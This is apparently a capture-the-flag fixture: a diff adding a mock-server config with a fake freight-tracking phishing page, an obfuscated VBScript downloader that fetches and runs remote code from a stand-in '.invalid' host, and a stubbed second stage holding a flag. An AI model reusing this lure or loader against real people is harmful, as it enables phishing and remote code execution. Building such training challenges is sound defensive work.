@@ -1,0 +1,61 @@
+ttl_minutes = 60
+flag_prefix = "notice"
+
+[[route]]
+method = "GET"
+path = "/"
+[route.respond]
+status = 200
+content_type = "text/html; charset=utf-8"
+body = '''<!doctype html><html><head><meta charset="utf-8"><title>Ravenport Freight - Track</title></head>
+<body style="font-family:sans-serif;max-width:32rem;margin:3rem auto"><h2>Ravenport Freight</h2>
+<p>Shipment 4417-ZA has been delayed. Open the attached notice for details.</p>
+<p><a href="/dl/Shipment_Notice.vbs.txt">Shipment_Notice.vbs.txt</a></p></body></html>
+'''
+
+[[route]]
+method = "GET"
+path = "/dl/Shipment_Notice.vbs.txt"
+[route.respond]
+status = 200
+content_type = "text/plain; charset=utf-8"
+headers = { "content-disposition" = 'attachment; filename="Shipment_Notice.vbs.txt"' }
+body = '''Option Explicit
+' Shipment_Notice.vbs
+Function D(s)
+  Dim i, o
+  For i = 1 To Len(s)
+    o = o & Chr(Asc(Mid(s, i, 1)) - 3)
+  Next
+  D = o
+End Function
+
+Dim h, t, u, r
+Set h = CreateObject(D("PV[PO51[POKWWS1913"))
+t = StrReverse("{{rev:d:tok}}")
+u = D("kwws=22fgq1vklsqrwlfh1lqydolg2y52") & t & D("2pi1gdw")
+h.Open "GET", u, False
+h.setRequestHeader D("[0Wudfn"), D("vq0446:")
+h.Send
+If h.Status = 200 Then
+  Execute h.responseText
+End If
+'''
+
+[[route]]
+method = "GET"
+path = "/v2/{{d:tok}}/mf.dat"
+[route.when]
+header = { "x-track" = 'sn-1137' }
+[route.respond]
+status = 200
+content_type = "text/plain; charset=utf-8"
+body = '''' stage 2
+Const CAMPAIGN = "ravenport-0412"
+Const KEY = "{{flag}}"
+' (the real stage would now collect files and post them to the gate)
+'''
+
+[fallback]
+status = 404
+body = "Not Found"
